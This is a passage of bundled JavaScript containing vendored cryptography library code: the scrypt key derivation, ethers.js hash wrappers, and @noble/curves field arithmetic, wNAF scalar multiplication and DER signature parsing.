    if (onProgress !== void 0 && typeof onProgress !== "function")
      throw new Error("progressCb should be function");
    const blockSize = 128 * r;
    const blockSize32 = blockSize / 4;
    if (N2 <= 1 || (N2 & N2 - 1) !== 0 || N2 >= 2 ** (blockSize / 8) || N2 > 2 ** 32) {
      throw new Error("Scrypt: N must be larger than 1, a power of 2, less than 2^(128 * r / 8) and less than 2^32");
    }
    if (p < 0 || p > (2 ** 32 - 1) * 32 / blockSize) {
      throw new Error("Scrypt: p must be a positive integer less than or equal to ((2^32 - 1) * 32) / (128 * r)");
    }
    if (dkLen < 0 || dkLen > (2 ** 32 - 1) * 32) {
      throw new Error("Scrypt: dkLen should be positive integer less than or equal to (2^32 - 1) * 32");
    }
    const memUsed = blockSize * (N2 + p);
    if (memUsed > maxmem) {
      throw new Error(`Scrypt: parameters too large, ${memUsed} (128 * r * (N + p)) > ${maxmem} (maxmem)`);
    }
    const B = pbkdf2(sha256, password, salt, { c: 1, dkLen: blockSize * p });
    const B32 = u32(B);
    const V = u32(new Uint8Array(blockSize * N2));
    const tmp = u32(new Uint8Array(blockSize));
    let blockMixCb = () => {
    };
    if (onProgress) {
      const totalBlockMix = 2 * N2 * p;
      const callbackPer = Math.max(Math.floor(totalBlockMix / 1e4), 1);
      let blockMixCnt = 0;
      blockMixCb = () => {
        blockMixCnt++;
        if (onProgress && (!(blockMixCnt % callbackPer) || blockMixCnt === totalBlockMix))
          onProgress(blockMixCnt / totalBlockMix);
      };
    }
    return { N: N2, r, p, dkLen, blockSize32, V, B32, B, tmp, blockMixCb, asyncTick };
  }
  function scryptOutput(password, dkLen, B, V, tmp) {
    const res = pbkdf2(sha256, password, B, { c: 1, dkLen });
    B.fill(0);
    V.fill(0);
    tmp.fill(0);
    return res;
  }
  function scrypt(password, salt, opts) {
    const { N: N2, r, p, dkLen, blockSize32, V, B32, B, tmp, blockMixCb } = scryptInit(password, salt, opts);
    for (let pi = 0; pi < p; pi++) {
      const Pi2 = blockSize32 * pi;
      for (let i = 0; i < blockSize32; i++)
        V[i] = B32[Pi2 + i];
      for (let i = 0, pos = 0; i < N2 - 1; i++) {
        BlockMix(V, pos, V, pos += blockSize32, r);
        blockMixCb();
      }
      BlockMix(V, (N2 - 1) * blockSize32, B32, Pi2, r);
      blockMixCb();
      for (let i = 0; i < N2; i++) {
        const j = B32[Pi2 + blockSize32 - 16] % N2;
        for (let k = 0; k < blockSize32; k++)
          tmp[k] = B32[Pi2 + k] ^ V[j * blockSize32 + k];
        BlockMix(tmp, 0, B32, Pi2, r);
        blockMixCb();
      }
    }
    return scryptOutput(password, dkLen, B, V, tmp);
  }
  async function scryptAsync(password, salt, opts) {
    const { N: N2, r, p, dkLen, blockSize32, V, B32, B, tmp, blockMixCb, asyncTick } = scryptInit(password, salt, opts);
    for (let pi = 0; pi < p; pi++) {
      const Pi2 = blockSize32 * pi;
      for (let i = 0; i < blockSize32; i++)
        V[i] = B32[Pi2 + i];
      let pos = 0;
      await asyncLoop(N2 - 1, asyncTick, () => {
        BlockMix(V, pos, V, pos += blockSize32, r);
        blockMixCb();
      });
      BlockMix(V, (N2 - 1) * blockSize32, B32, Pi2, r);
      blockMixCb();
      await asyncLoop(N2, asyncTick, () => {
        const j = B32[Pi2 + blockSize32 - 16] % N2;
        for (let k = 0; k < blockSize32; k++)
          tmp[k] = B32[Pi2 + k] ^ V[j * blockSize32 + k];
        BlockMix(tmp, 0, B32, Pi2, r);
        blockMixCb();
      });
    }
    return scryptOutput(password, dkLen, B, V, tmp);
  }

  // node_modules/ethers/lib.esm/crypto/scrypt.js
  var lockedSync = false;
  var lockedAsync = false;
  var _scryptAsync = async function(passwd, salt, N2, r, p, dkLen, onProgress) {
    return await scryptAsync(passwd, salt, { N: N2, r, p, dkLen, onProgress });
  };
  var _scryptSync = function(passwd, salt, N2, r, p, dkLen) {
    return scrypt(passwd, salt, { N: N2, r, p, dkLen });
  };
  var __scryptAsync = _scryptAsync;
  var __scryptSync = _scryptSync;
  async function scrypt2(_passwd, _salt, N2, r, p, dkLen, progress) {
    const passwd = getBytes(_passwd, "passwd");
    const salt = getBytes(_salt, "salt");
    return hexlify(await __scryptAsync(passwd, salt, N2, r, p, dkLen, progress));
  }
  scrypt2._ = _scryptAsync;
  scrypt2.lock = function() {
    lockedAsync = true;
  };
  scrypt2.register = function(func) {
    if (lockedAsync) {
      throw new Error("scrypt is locked");
    }
    __scryptAsync = func;
  };
  Object.freeze(scrypt2);
  function scryptSync(_passwd, _salt, N2, r, p, dkLen) {
    const passwd = getBytes(_passwd, "passwd");
    const salt = getBytes(_salt, "salt");
    return hexlify(__scryptSync(passwd, salt, N2, r, p, dkLen));
  }
  scryptSync._ = _scryptSync;
  scryptSync.lock = function() {
    lockedSync = true;
  };
  scryptSync.register = function(func) {
    if (lockedSync) {
      throw new Error("scryptSync is locked");
    }
    __scryptSync = func;
  };
  Object.freeze(scryptSync);

  // node_modules/ethers/lib.esm/crypto/sha2.js
  var _sha256 = function(data) {
    return createHash("sha256").update(data).digest();
  };
  var _sha512 = function(data) {
    return createHash("sha512").update(data).digest();
  };
  var __sha256 = _sha256;
  var __sha512 = _sha512;
  var locked256 = false;
  var locked512 = false;
  function sha2562(_data) {
    const data = getBytes(_data, "data");
    return hexlify(__sha256(data));
  }
  sha2562._ = _sha256;
  sha2562.lock = function() {
    locked256 = true;
  };
  sha2562.register = function(func) {
    if (locked256) {
      throw new Error("sha256 is locked");
    }
    __sha256 = func;
  };
  Object.freeze(sha2562);
  function sha5122(_data) {
    const data = getBytes(_data, "data");
    return hexlify(__sha512(data));
  }
  sha5122._ = _sha512;
  sha5122.lock = function() {
    locked512 = true;
  };
  sha5122.register = function(func) {
    if (locked512) {
      throw new Error("sha512 is locked");
    }
    __sha512 = func;
  };
  Object.freeze(sha2562);

  // node_modules/@noble/curves/esm/abstract/utils.js
  var utils_exports = {};
  __export(utils_exports, {
    bitGet: () => bitGet,
    bitLen: () => bitLen,
    bitMask: () => bitMask,
    bitSet: () => bitSet,
    bytesToHex: () => bytesToHex,
    bytesToNumberBE: () => bytesToNumberBE,
    bytesToNumberLE: () => bytesToNumberLE,
    concatBytes: () => concatBytes2,
    createHmacDrbg: () => createHmacDrbg,
    ensureBytes: () => ensureBytes,
    equalBytes: () => equalBytes,
    hexToBytes: () => hexToBytes,
    hexToNumber: () => hexToNumber,
    numberToBytesBE: () => numberToBytesBE,
    numberToBytesLE: () => numberToBytesLE,
    numberToHexUnpadded: () => numberToHexUnpadded,
    numberToVarBytesBE: () => numberToVarBytesBE,
    utf8ToBytes: () => utf8ToBytes2,
    validateObject: () => validateObject
  });
  var _0n2 = BigInt(0);
  var _1n2 = BigInt(1);
  var _2n2 = BigInt(2);
  var u8a2 = (a) => a instanceof Uint8Array;
  var hexes = /* @__PURE__ */ Array.from({ length: 256 }, (_, i) => i.toString(16).padStart(2, "0"));
  function bytesToHex(bytes2) {
    if (!u8a2(bytes2))
      throw new Error("Uint8Array expected");
    let hex = "";
    for (let i = 0; i < bytes2.length; i++) {
      hex += hexes[bytes2[i]];
    }
    return hex;
  }
  function numberToHexUnpadded(num) {
    const hex = num.toString(16);
    return hex.length & 1 ? `0${hex}` : hex;
  }
  function hexToNumber(hex) {
    if (typeof hex !== "string")
      throw new Error("hex string expected, got " + typeof hex);
    return BigInt(hex === "" ? "0" : `0x${hex}`);
  }
  function hexToBytes(hex) {
    if (typeof hex !== "string")
      throw new Error("hex string expected, got " + typeof hex);
    const len = hex.length;
    if (len % 2)
      throw new Error("padded hex string expected, got unpadded hex of length " + len);
    const array = new Uint8Array(len / 2);
    for (let i = 0; i < array.length; i++) {
      const j = i * 2;
      const hexByte = hex.slice(j, j + 2);
      const byte = Number.parseInt(hexByte, 16);
      if (Number.isNaN(byte) || byte < 0)
        throw new Error("Invalid byte sequence");
      array[i] = byte;
    }
    return array;
  }
  function bytesToNumberBE(bytes2) {
    return hexToNumber(bytesToHex(bytes2));
  }
  function bytesToNumberLE(bytes2) {
    if (!u8a2(bytes2))
      throw new Error("Uint8Array expected");
    return hexToNumber(bytesToHex(Uint8Array.from(bytes2).reverse()));
  }
  function numberToBytesBE(n, len) {
    return hexToBytes(n.toString(16).padStart(len * 2, "0"));
  }
  function numberToBytesLE(n, len) {
    return numberToBytesBE(n, len).reverse();
  }
  function numberToVarBytesBE(n) {
    return hexToBytes(numberToHexUnpadded(n));
  }
  function ensureBytes(title, hex, expectedLength) {
    let res;
    if (typeof hex === "string") {
      try {
        res = hexToBytes(hex);
      } catch (e) {
        throw new Error(`${title} must be valid hex string, got "${hex}". Cause: ${e}`);
      }
    } else if (u8a2(hex)) {
      res = Uint8Array.from(hex);
    } else {
      throw new Error(`${title} must be hex string or Uint8Array`);
    }
    const len = res.length;
    if (typeof expectedLength === "number" && len !== expectedLength)
      throw new Error(`${title} expected ${expectedLength} bytes, got ${len}`);
    return res;
  }
  function concatBytes2(...arrays) {
    const r = new Uint8Array(arrays.reduce((sum, a) => sum + a.length, 0));
    let pad = 0;
    arrays.forEach((a) => {
      if (!u8a2(a))
        throw new Error("Uint8Array expected");
      r.set(a, pad);
      pad += a.length;
    });
    return r;
  }
  function equalBytes(b1, b2) {
    if (b1.length !== b2.length)
      return false;
    for (let i = 0; i < b1.length; i++)
      if (b1[i] !== b2[i])
        return false;
    return true;
  }
  function utf8ToBytes2(str) {
    if (typeof str !== "string")
      throw new Error(`utf8ToBytes expected string, got ${typeof str}`);
    return new Uint8Array(new TextEncoder().encode(str));
  }
  function bitLen(n) {
    let len;
    for (len = 0; n > _0n2; n >>= _1n2, len += 1)
      ;
    return len;
  }
  function bitGet(n, pos) {
    return n >> BigInt(pos) & _1n2;
  }
  var bitSet = (n, pos, value) => {
    return n | (value ? _1n2 : _0n2) << BigInt(pos);
  };
  var bitMask = (n) => (_2n2 << BigInt(n - 1)) - _1n2;
  var u8n = (data) => new Uint8Array(data);
  var u8fr = (arr) => Uint8Array.from(arr);
  function createHmacDrbg(hashLen, qByteLen, hmacFn) {
    if (typeof hashLen !== "number" || hashLen < 2)
      throw new Error("hashLen must be a number");
    if (typeof qByteLen !== "number" || qByteLen < 2)
      throw new Error("qByteLen must be a number");
    if (typeof hmacFn !== "function")
      throw new Error("hmacFn must be a function");
    let v = u8n(hashLen);
    let k = u8n(hashLen);
    let i = 0;
    const reset = () => {
      v.fill(1);
      k.fill(0);
      i = 0;
    };
    const h = (...b) => hmacFn(k, v, ...b);
    const reseed = (seed = u8n()) => {
      k = h(u8fr([0]), seed);
      v = h();
      if (seed.length === 0)
        return;
      k = h(u8fr([1]), seed);
      v = h();
    };
    const gen2 = () => {
      if (i++ >= 1e3)
        throw new Error("drbg: tried 1000 values");
      let len = 0;
      const out = [];
      while (len < qByteLen) {
        v = h();
        const sl = v.slice();
        out.push(sl);
        len += v.length;
      }
      return concatBytes2(...out);
    };
    const genUntil = (seed, pred) => {
      reset();
      reseed(seed);
      let res = void 0;
      while (!(res = pred(gen2())))
        reseed();
      reset();
      return res;
    };
    return genUntil;
  }
  var validatorFns = {
    bigint: (val) => typeof val === "bigint",
    function: (val) => typeof val === "function",
    boolean: (val) => typeof val === "boolean",
    string: (val) => typeof val === "string",
    stringOrUint8Array: (val) => typeof val === "string" || val instanceof Uint8Array,
    isSafeInteger: (val) => Number.isSafeInteger(val),
    array: (val) => Array.isArray(val),
    field: (val, object) => object.Fp.isValid(val),
    hash: (val) => typeof val === "function" && Number.isSafeInteger(val.outputLen)
  };
  function validateObject(object, validators, optValidators = {}) {
    const checkField = (fieldName, type, isOptional) => {
      const checkVal = validatorFns[type];
      if (typeof checkVal !== "function")
        throw new Error(`Invalid validator "${type}", expected function`);
      const val = object[fieldName];
      if (isOptional && val === void 0)
        return;
      if (!checkVal(val, object)) {
        throw new Error(`Invalid param ${String(fieldName)}=${val} (${typeof val}), expected ${type}`);
      }
    };
    for (const [fieldName, type] of Object.entries(validators))
      checkField(fieldName, type, false);
    for (const [fieldName, type] of Object.entries(optValidators))
      checkField(fieldName, type, true);
    return object;
  }

  // node_modules/@noble/curves/esm/abstract/modular.js
  var _0n3 = BigInt(0);
  var _1n3 = BigInt(1);
  var _2n3 = BigInt(2);
  var _3n = BigInt(3);
  var _4n = BigInt(4);
  var _5n = BigInt(5);
  var _8n = BigInt(8);
  var _9n = BigInt(9);
  var _16n = BigInt(16);
  function mod(a, b) {
    const result = a % b;
    return result >= _0n3 ? result : b + result;
  }
  function pow(num, power, modulo) {
    if (modulo <= _0n3 || power < _0n3)
      throw new Error("Expected power/modulo > 0");
    if (modulo === _1n3)
      return _0n3;
    let res = _1n3;
    while (power > _0n3) {
      if (power & _1n3)
        res = res * num % modulo;
      num = num * num % modulo;
      power >>= _1n3;
    }
    return res;
  }
  function pow2(x, power, modulo) {
    let res = x;
    while (power-- > _0n3) {
      res *= res;
      res %= modulo;
    }
    return res;
  }
  function invert(number2, modulo) {
    if (number2 === _0n3 || modulo <= _0n3) {
      throw new Error(`invert: expected positive integers, got n=${number2} mod=${modulo}`);
    }
    let a = mod(number2, modulo);
    let b = modulo;
    let x = _0n3, y = _1n3, u = _1n3, v = _0n3;
    while (a !== _0n3) {
      const q = b / a;
      const r = b % a;
      const m = x - u * q;
      const n = y - v * q;
      b = a, a = r, x = u, y = v, u = m, v = n;
    }
    const gcd = b;
    if (gcd !== _1n3)
      throw new Error("invert: does not exist");
    return mod(x, modulo);
  }
  function tonelliShanks(P) {
    const legendreC = (P - _1n3) / _2n3;
    let Q, S2, Z;
    for (Q = P - _1n3, S2 = 0; Q % _2n3 === _0n3; Q /= _2n3, S2++)
      ;
    for (Z = _2n3; Z < P && pow(Z, legendreC, P) !== P - _1n3; Z++)
      ;
    if (S2 === 1) {
      const p1div4 = (P + _1n3) / _4n;
      return function tonelliFast(Fp2, n) {
        const root = Fp2.pow(n, p1div4);
        if (!Fp2.eql(Fp2.sqr(root), n))
          throw new Error("Cannot find square root");
        return root;
      };
    }
    const Q1div2 = (Q + _1n3) / _2n3;
    return function tonelliSlow(Fp2, n) {
      if (Fp2.pow(n, legendreC) === Fp2.neg(Fp2.ONE))
        throw new Error("Cannot find square root");
      let r = S2;
      let g = Fp2.pow(Fp2.mul(Fp2.ONE, Z), Q);
      let x = Fp2.pow(n, Q1div2);
      let b = Fp2.pow(n, Q);
      while (!Fp2.eql(b, Fp2.ONE)) {
        if (Fp2.eql(b, Fp2.ZERO))
          return Fp2.ZERO;
        let m = 1;
        for (let t2 = Fp2.sqr(b); m < r; m++) {
          if (Fp2.eql(t2, Fp2.ONE))
            break;
          t2 = Fp2.sqr(t2);
        }
        const ge = Fp2.pow(g, _1n3 << BigInt(r - m - 1));
        g = Fp2.sqr(ge);
        x = Fp2.mul(x, ge);
        b = Fp2.mul(b, g);
        r = m;
      }
      return x;
    };
  }
  function FpSqrt(P) {
    if (P % _4n === _3n) {
      const p1div4 = (P + _1n3) / _4n;
      return function sqrt3mod4(Fp2, n) {
        const root = Fp2.pow(n, p1div4);
        if (!Fp2.eql(Fp2.sqr(root), n))
          throw new Error("Cannot find square root");
        return root;
      };
    }
    if (P % _8n === _5n) {
      const c1 = (P - _5n) / _8n;
      return function sqrt5mod8(Fp2, n) {
        const n2 = Fp2.mul(n, _2n3);
        const v = Fp2.pow(n2, c1);
        const nv = Fp2.mul(n, v);
        const i = Fp2.mul(Fp2.mul(nv, _2n3), v);
        const root = Fp2.mul(nv, Fp2.sub(i, Fp2.ONE));
        if (!Fp2.eql(Fp2.sqr(root), n))
          throw new Error("Cannot find square root");
        return root;
      };
    }
    if (P % _16n === _9n) {
    }
    return tonelliShanks(P);
  }
  var FIELD_FIELDS = [
    "create",
    "isValid",
    "is0",
    "neg",
    "inv",
    "sqrt",
    "sqr",
    "eql",
    "add",
    "sub",
    "mul",
    "pow",
    "div",
    "addN",
    "subN",
    "mulN",
    "sqrN"
  ];
  function validateField(field) {
    const initial = {
      ORDER: "bigint",
      MASK: "bigint",
      BYTES: "isSafeInteger",
      BITS: "isSafeInteger"
    };
    const opts = FIELD_FIELDS.reduce((map, val) => {
      map[val] = "function";
      return map;
    }, initial);
    return validateObject(field, opts);
  }
  function FpPow(f2, num, power) {
    if (power < _0n3)
      throw new Error("Expected power > 0");
    if (power === _0n3)
      return f2.ONE;
    if (power === _1n3)
      return num;
    let p = f2.ONE;
    let d = num;
    while (power > _0n3) {
      if (power & _1n3)
        p = f2.mul(p, d);
      d = f2.sqr(d);
      power >>= _1n3;
    }
    return p;
  }
  function FpInvertBatch(f2, nums) {
    const tmp = new Array(nums.length);
    const lastMultiplied = nums.reduce((acc, num, i) => {
      if (f2.is0(num))
        return acc;
      tmp[i] = acc;
      return f2.mul(acc, num);
    }, f2.ONE);
    const inverted = f2.inv(lastMultiplied);
    nums.reduceRight((acc, num, i) => {
      if (f2.is0(num))
        return acc;
      tmp[i] = f2.mul(acc, tmp[i]);
      return f2.mul(acc, num);
    }, inverted);
    return tmp;
  }
  function nLength(n, nBitLength) {
    const _nBitLength = nBitLength !== void 0 ? nBitLength : n.toString(2).length;
    const nByteLength = Math.ceil(_nBitLength / 8);
    return { nBitLength: _nBitLength, nByteLength };
  }
  function Field(ORDER, bitLen2, isLE2 = false, redef = {}) {
    if (ORDER <= _0n3)
      throw new Error(`Expected Field ORDER > 0, got ${ORDER}`);
    const { nBitLength: BITS, nByteLength: BYTES } = nLength(ORDER, bitLen2);
    if (BYTES > 2048)
      throw new Error("Field lengths over 2048 bytes are not supported");
    const sqrtP = FpSqrt(ORDER);
    const f2 = Object.freeze({
      ORDER,
      BITS,
      BYTES,
      MASK: bitMask(BITS),
      ZERO: _0n3,
      ONE: _1n3,
      create: (num) => mod(num, ORDER),
      isValid: (num) => {
        if (typeof num !== "bigint")
          throw new Error(`Invalid field element: expected bigint, got ${typeof num}`);
        return _0n3 <= num && num < ORDER;
      },
      is0: (num) => num === _0n3,
      isOdd: (num) => (num & _1n3) === _1n3,
      neg: (num) => mod(-num, ORDER),
      eql: (lhs, rhs) => lhs === rhs,
      sqr: (num) => mod(num * num, ORDER),
      add: (lhs, rhs) => mod(lhs + rhs, ORDER),
      sub: (lhs, rhs) => mod(lhs - rhs, ORDER),
      mul: (lhs, rhs) => mod(lhs * rhs, ORDER),
      pow: (num, power) => FpPow(f2, num, power),
      div: (lhs, rhs) => mod(lhs * invert(rhs, ORDER), ORDER),
      // Same as above, but doesn't normalize
      sqrN: (num) => num * num,
      addN: (lhs, rhs) => lhs + rhs,
      subN: (lhs, rhs) => lhs - rhs,
      mulN: (lhs, rhs) => lhs * rhs,
      inv: (num) => invert(num, ORDER),
      sqrt: redef.sqrt || ((n) => sqrtP(f2, n)),
      invertBatch: (lst) => FpInvertBatch(f2, lst),
      // TODO: do we really need constant cmov?
      // We don't have const-time bigints anyway, so probably will be not very useful
      cmov: (a, b, c) => c ? b : a,
      toBytes: (num) => isLE2 ? numberToBytesLE(num, BYTES) : numberToBytesBE(num, BYTES),
      fromBytes: (bytes2) => {
        if (bytes2.length !== BYTES)
          throw new Error(`Fp.fromBytes: expected ${BYTES}, got ${bytes2.length}`);
        return isLE2 ? bytesToNumberLE(bytes2) : bytesToNumberBE(bytes2);
      }
    });
    return Object.freeze(f2);
  }
  function getFieldBytesLength(fieldOrder) {
    if (typeof fieldOrder !== "bigint")
      throw new Error("field order must be bigint");
    const bitLength = fieldOrder.toString(2).length;
    return Math.ceil(bitLength / 8);
  }
  function getMinHashLength(fieldOrder) {
    const length = getFieldBytesLength(fieldOrder);
    return length + Math.ceil(length / 2);
  }
  function mapHashToField(key, fieldOrder, isLE2 = false) {
    const len = key.length;
    const fieldLen = getFieldBytesLength(fieldOrder);
    const minLen = getMinHashLength(fieldOrder);
    if (len < 16 || len < minLen || len > 1024)
      throw new Error(`expected ${minLen}-1024 bytes of input, got ${len}`);
    const num = isLE2 ? bytesToNumberBE(key) : bytesToNumberLE(key);
    const reduced = mod(num, fieldOrder - _1n3) + _1n3;
    return isLE2 ? numberToBytesLE(reduced, fieldLen) : numberToBytesBE(reduced, fieldLen);
  }

  // node_modules/@noble/curves/esm/abstract/curve.js
  var _0n4 = BigInt(0);
  var _1n4 = BigInt(1);
  function wNAF(c, bits) {
    const constTimeNegate = (condition, item) => {
      const neg = item.negate();
      return condition ? neg : item;
    };
    const opts = (W) => {
      const windows = Math.ceil(bits / W) + 1;
      const windowSize = 2 ** (W - 1);
      return { windows, windowSize };
    };
    return {
      constTimeNegate,
      // non-const time multiplication ladder
      unsafeLadder(elm, n) {
        let p = c.ZERO;
        let d = elm;
        while (n > _0n4) {
          if (n & _1n4)
            p = p.add(d);
          d = d.double();
          n >>= _1n4;
        }
        return p;
      },
      /**
       * Creates a wNAF precomputation window. Used for caching.
       * Default window size is set by `utils.precompute()` and is equal to 8.
       * Number of precomputed points depends on the curve size:
       * 2^(𝑊−1) * (Math.ceil(𝑛 / 𝑊) + 1), where:
       * - 𝑊 is the window size
       * - 𝑛 is the bitlength of the curve order.
       * For a 256-bit curve and window size 8, the number of precomputed points is 128 * 33 = 4224.
       * @returns precomputed point tables flattened to a single array
       */
      precomputeWindow(elm, W) {
        const { windows, windowSize } = opts(W);
        const points = [];
        let p = elm;
        let base = p;
        for (let window2 = 0; window2 < windows; window2++) {
          base = p;
          points.push(base);
          for (let i = 1; i < windowSize; i++) {
            base = base.add(p);
            points.push(base);
          }
          p = base.double();
        }
        return points;
      },
      /**
       * Implements ec multiplication using precomputed tables and w-ary non-adjacent form.
       * @param W window size
       * @param precomputes precomputed tables
       * @param n scalar (we don't check here, but should be less than curve order)
       * @returns real and fake (for const-time) points
       */
      wNAF(W, precomputes, n) {
        const { windows, windowSize } = opts(W);
        let p = c.ZERO;
        let f2 = c.BASE;
        const mask2 = BigInt(2 ** W - 1);
        const maxNumber = 2 ** W;
        const shiftBy = BigInt(W);
        for (let window2 = 0; window2 < windows; window2++) {
          const offset = window2 * windowSize;
          let wbits = Number(n & mask2);
          n >>= shiftBy;
          if (wbits > windowSize) {
            wbits -= maxNumber;
            n += _1n4;
          }
          const offset1 = offset;
          const offset2 = offset + Math.abs(wbits) - 1;
          const cond1 = window2 % 2 !== 0;
          const cond2 = wbits < 0;
          if (wbits === 0) {
            f2 = f2.add(constTimeNegate(cond1, precomputes[offset1]));
          } else {
            p = p.add(constTimeNegate(cond2, precomputes[offset2]));
          }
        }
        return { p, f: f2 };
      },
      wNAFCached(P, precomputesMap, n, transform) {
        const W = P._WINDOW_SIZE || 1;
        let comp = precomputesMap.get(P);
        if (!comp) {
          comp = this.precomputeWindow(P, W);
          if (W !== 1) {
            precomputesMap.set(P, transform(comp));
          }
        }
        return this.wNAF(W, comp, n);
      }
    };
  }
  function validateBasic(curve) {
    validateField(curve.Fp);
    validateObject(curve, {
      n: "bigint",
      h: "bigint",
      Gx: "field",
      Gy: "field"
    }, {
      nBitLength: "isSafeInteger",
      nByteLength: "isSafeInteger"
    });
    return Object.freeze({
      ...nLength(curve.n, curve.nBitLength),
      ...curve,
      ...{ p: curve.Fp.ORDER }
    });
  }

  // node_modules/@noble/curves/esm/abstract/weierstrass.js
  function validatePointOpts(curve) {
    const opts = validateBasic(curve);
    validateObject(opts, {
      a: "field",
      b: "field"
    }, {
      allowedPrivateKeyLengths: "array",
      wrapPrivateKey: "boolean",
      isTorsionFree: "function",
      clearCofactor: "function",
      allowInfinityPoint: "boolean",
      fromBytes: "function",
      toBytes: "function"
    });
    const { endo, Fp: Fp2, a } = opts;
    if (endo) {
      if (!Fp2.eql(a, Fp2.ZERO)) {
        throw new Error("Endomorphism can only be defined for Koblitz curves that have a=0");
      }
      if (typeof endo !== "object" || typeof endo.beta !== "bigint" || typeof endo.splitScalar !== "function") {
        throw new Error("Expected endomorphism with beta: bigint and splitScalar: function");
      }
    }
    return Object.freeze({ ...opts });
  }
  var { bytesToNumberBE: b2n, hexToBytes: h2b } = utils_exports;
  var DER = {
    // asn.1 DER encoding utils
    Err: class DERErr extends Error {
      constructor(m = "") {
        super(m);
      }
    },
    _parseInt(data) {
      const { Err: E } = DER;
      if (data.length < 2 || data[0] !== 2)
        throw new E("Invalid signature integer tag");
      const len = data[1];
      const res = data.subarray(2, len + 2);
      if (!len || res.length !== len)
        throw new E("Invalid signature integer: wrong length");
      if (res[0] & 128)
        throw new E("Invalid signature integer: negative");
      if (res[0] === 0 && !(res[1] & 128))
        throw new E("Invalid signature integer: unnecessary leading zero");
      return { d: b2n(res), l: data.subarray(len + 2) };
    },
    toSig(hex) {
      const { Err: E } = DER;
      const data = typeof hex === "string" ? h2b(hex) : hex;
      if (!(data instanceof Uint8Array))
        throw new Error("ui8a expected");
      let l = data.length;
      if (l < 2 || data[0] != 48)
        throw new E("Invalid signature tag");
      if (data[1] !== l - 2)
        throw new E("Invalid signature: incorrect length");
      const { d: r, l: sBytes } = DER._parseInt(data.subarray(2));
      const { d: s, l: rBytesLeft } = DER._parseInt(sBytes);
      if (rBytesLeft.length)
        throw new E("Invalid signature: left bytes after parsing");
      return { r, s };
    },
    hexFromSig(sig) {
      const slice = (s2) => Number.parseInt(s2[0], 16) & 8 ? "00" + s2 : s2;
      const h = (num) => {
        const hex = num.toString(16);
        return hex.length & 1 ? `0${hex}` : hex;
      };
      const s = slice(h(sig.s));
      const r = slice(h(sig.r));
      const shl = s.length / 2;
      const rhl = r.length / 2;
      const sl = h(shl);
      const rl = h(rhl);
      return `30${h(rhl + shl + 4)}02${rl}${r}02${sl}${s}`;
    }
  };
  var _0n5 = BigInt(0);
  var _1n5 = BigInt(1);
  var _2n4 = BigInt(2);
  var _3n2 = BigInt(3);
  var _4n2 = BigInt(4);
  function weierstrassPoints(opts) {
    const CURVE = validatePointOpts(opts);
    const { Fp: Fp2 } = CURVE;
    const toBytes2 = CURVE.toBytes || ((_c, point, _isCompressed) => {
      const a = point.toAffine();
      return concatBytes2(Uint8Array.from([4]), Fp2.toBytes(a.x), Fp2.toBytes(a.y));
    });
    const fromBytes = CURVE.fromBytes || ((bytes2) => {
      const tail = bytes2.subarray(1);
      const x = Fp2.fromBytes(tail.subarray(0, Fp2.BYTES));
      const y = Fp2.fromBytes(tail.subarray(Fp2.BYTES, 2 * Fp2.BYTES));
      return { x, y };
    });
    function weierstrassEquation(x) {
      const { a, b } = CURVE;
      const x2 = Fp2.sqr(x);
      const x3 = Fp2.mul(x2, x);
      return Fp2.add(Fp2.add(x3, Fp2.mul(x, a)), b);
    }
    if (!Fp2.eql(Fp2.sqr(CURVE.Gy), weierstrassEquation(CURVE.Gx)))
      throw new Error("bad generator point: equation left != right");
    function isWithinCurveOrder(num) {
      return typeof num === "bigint" && _0n5 < num && num < CURVE.n;
    }
    function assertGE(num) {
      if (!isWithinCurveOrder(num))
        throw new Error("Expected valid bigint: 0 < bigint < curve.n");
    }
    function normPrivateKeyToScalar(key) {
      const { allowedPrivateKeyLengths: lengths, nByteLength, wrapPrivateKey, n } = CURVE;
      if (lengths && typeof key !== "bigint") {
        if (key instanceof Uint8Array)
          key = bytesToHex(key);
        if (typeof key !== "string" || !lengths.includes(key.length))
          throw new Error("Invalid key");
        key = key.padStart(nByteLength * 2, "0");
      }
      let num;
      try {
        num = typeof key === "bigint" ? key : bytesToNumberBE(ensureBytes("private key", key, nByteLength));
      } catch (error) {
        throw new Error(`private key must be ${nByteLength} bytes, hex or bigint, not ${typeof key}`);
      }
      if (wrapPrivateKey)
        num = mod(num, n);
      assertGE(num);
      return num;
    }
    const pointPrecomputes = /* @__PURE__ */ new Map();
    function assertPrjPoint(other) {
      if (!(other instanceof Point2))
        throw new Error("ProjectivePoint expected");
    }
    class Point2 {
      constructor(px, py, pz) {
        this.px = px;
        this.py = py;
        this.pz = pz;
        if (px == null || !Fp2.isValid(px))
          throw new Error("x required");
        if (py == null || !Fp2.isValid(py))
          throw new Error("y required");
        if (pz == null || !Fp2.isValid(pz))
          throw new Error("z required");
      }
      // Does not validate if the point is on-curve.
      // Use fromHex instead, or call assertValidity() later.
      static fromAffine(p) {
        const { x, y } = p || {};
        if (!p || !Fp2.isValid(x) || !Fp2.isValid(y))
          throw new Error("invalid affine point");
        if (p instanceof Point2)
          throw new Error("projective point not allowed");
        const is0 = (i) => Fp2.eql(i, Fp2.ZERO);
        if (is0(x) && is0(y))
          return Point2.ZERO;
        return new Point2(x, y, Fp2.ONE);
      }
      get x() {
        return this.toAffine().x;
      }
      get y() {
        return this.toAffine().y;
      }
      /**
       * Takes a bunch of Projective Points but executes only one
       * inversion on all of them. Inversion is very slow operation,
       * so this improves performance massively.
       * Optimization: converts a list of projective points to a list of identical points with Z=1.
       */
      static normalizeZ(points) {
        const toInv = Fp2.invertBatch(points.map((p) => p.pz));
        return points.map((p, i) => p.toAffine(toInv[i])).map(Point2.fromAffine);
      }
      /**
       * Converts hash string or Uint8Array to Point.
       * @param hex short/long ECDSA hex
       */
      static fromHex(hex) {
        const P = Point2.fromAffine(fromBytes(ensureBytes("pointHex", hex)));
        P.assertValidity();
        return P;
      }
      // Multiplies generator point by privateKey.
      static fromPrivateKey(privateKey) {
        return Point2.BASE.multiply(normPrivateKeyToScalar(privateKey));
      }
      // "Private method", don't use it directly
      _setWindowSize(windowSize) {
        this._WINDOW_SIZE = windowSize;
        pointPrecomputes.delete(this);
      }
      // A point on curve is valid if it conforms to equation.
      assertValidity() {
        if (this.is0()) {
          if (CURVE.allowInfinityPoint && !Fp2.is0(this.py))
            return;
          throw new Error("bad point: ZERO");
        }
        const { x, y } = this.toAffine();
        if (!Fp2.isValid(x) || !Fp2.isValid(y))
          throw new Error("bad point: x or y not FE");
        const left = Fp2.sqr(y);
        const right = weierstrassEquation(x);
        if (!Fp2.eql(left, right))
          throw new Error("bad point: equation left != right");
        if (!this.isTorsionFree())
